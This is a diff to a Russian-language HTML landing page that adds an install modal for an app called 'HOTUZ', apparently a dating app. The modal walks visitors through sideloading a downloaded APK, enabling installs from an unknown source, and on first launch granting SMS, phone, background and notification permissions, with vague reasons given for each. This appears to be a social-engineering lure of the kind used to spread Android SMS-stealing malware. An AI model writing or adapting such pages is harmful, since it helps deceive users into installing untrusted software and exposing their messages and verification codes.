@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html lang="ru">
 <head>
@@ -25,6 +24,89 @@
 
     <span id="download" class="download-anchor" aria-hidden="true"></span>
   </main>
+
+  <!-- Модальное окно -->
+  <div id="install-modal" class="modal-overlay" hidden>
+    <div class="modal">
+      <div class="modal-header">
+        <div class="modal-logo">
+          <span class="flame">🔥</span> HOTUZ
+        </div>
+        <button class="modal-close" id="modal-close" aria-label="Закрыть">×</button>
+      </div>
+
+      <h2 class="modal-title">Как установить и настроить <span>HOTUZ</span></h2>
+      <p class="modal-subtitle">Файл скачивается. Выполни все шаги по порядку</p>
+
+      <div class="section-label">
+        <span class="section-icon">🛡</span> 1. УСТАНОВКА
+      </div>
+
+      <div class="step">
+        <div class="step-num">↓</div>
+        <div class="step-content">
+          <strong>1. Откройте скачанный APK</strong>
+          <span>из уведомлений или папки Загрузки</span>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">⚙</div>
+        <div class="step-content">
+          <strong>2. Разрешите установку из этого источника</strong>
+          <span>в Настройках</span>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">📦</div>
+        <div class="step-content">
+          <strong>3. Нажмите Установить</strong>
+          <span>и дождитесь завершения</span>
+        </div>
+      </div>
+
+      <div class="section-label">
+        <span class="section-icon">👤</span> 2. РАЗРЕШЕНИЯ ПРИ ПЕРВОМ ЗАПУСКЕ
+      </div>
+      <p class="permissions-intro">При первом запуске обязательно выдайте эти разрешения:</p>
+
+      <div class="permission">
+        <div class="perm-icon">💬</div>
+        <div class="perm-content">
+          <strong>Сообщения (SMS)</strong>
+          <span>Нужно для подтверждения номера</span>
+        </div>
+      </div>
+
+      <div class="permission">
+        <div class="perm-icon">📞</div>
+        <div class="perm-content">
+          <strong>Телефон и звонки</strong>
+          <span>Для работы функций приложения</span>
+        </div>
+      </div>
+
+      <div class="permission">
+        <div class="perm-icon">🔄</div>
+        <div class="perm-content">
+          <strong>Работа в фоновом режиме</strong>
+          <span>Чтобы не пропускать сообщения</span>
+        </div>
+      </div>
+
+      <div class="permission">
+        <div class="perm-icon">🔔</div>
+        <div class="perm-content">
+          <strong>Уведомления</strong>
+          <span>Чтобы сразу видеть новые знакомства</span>
+        </div>
+      </div>
+
+      <button class="modal-btn" id="modal-ok">Всё понял, скачал ✨</button>
+    </div>
+  </div>
+
   <script src="script.js"></script>
 </body>
 </html>
